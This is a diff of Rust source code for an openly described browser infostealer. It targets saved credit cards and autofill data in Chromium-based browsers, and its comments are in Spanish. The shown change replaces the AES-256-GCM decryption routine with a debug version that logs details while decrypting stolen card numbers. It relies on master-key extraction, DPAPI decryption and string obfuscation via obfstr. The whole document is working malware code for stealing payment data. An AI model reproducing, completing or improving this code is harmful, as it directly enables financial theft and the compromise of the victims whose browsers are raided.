@@ -1,6 +1,6 @@
 // Stealer de tarjetas de crédito y autofill data de browsers
 use crate::stealer::common::get_appdata_local;
-use crate::stealer::chromium::{decrypt_value_dpapi, extract_master_key, decrypt_aes_gcm_bytes};
+use crate::stealer::chromium::{decrypt_value_dpapi, extract_master_key, decrypt_aes_gcm_bytes_debug};
 use rusqlite::Connection;
 use std::path::PathBuf;
 use obfstr::obfstr;
@@ -383,10 +383,18 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str, master_key: Optio
                                 let _ = writeln!(f, "      🔑 Intentando AES-256-GCM con master key...");
                             }
                             
-                            if let Some(decrypted) = decrypt_aes_gcm_bytes(&encrypted_number, key) {
+                            // Usar versión debug para obtener más información
+                            let (result, debug_log) = decrypt_aes_gcm_bytes_debug(&encrypted_number, key);
+                            
+                            if let Some(ref mut f) = log {
+                                use std::io::Write;
+                                let _ = write!(f, "{}", debug_log);
+                            }
+                            
+                            if let Some(decrypted) = result {
                                 if let Some(ref mut f) = log {
                                     use std::io::Write;
-                                    let _ = writeln!(f, "      ✅ AES-256-GCM decrypt OK, bytes: {}", decrypted.len());
+                                    let _ = writeln!(f, "      ✅ AES-256-GCM decrypt OK");
                                 }
                                 decrypted_bytes = Some(decrypted);
                             } else {
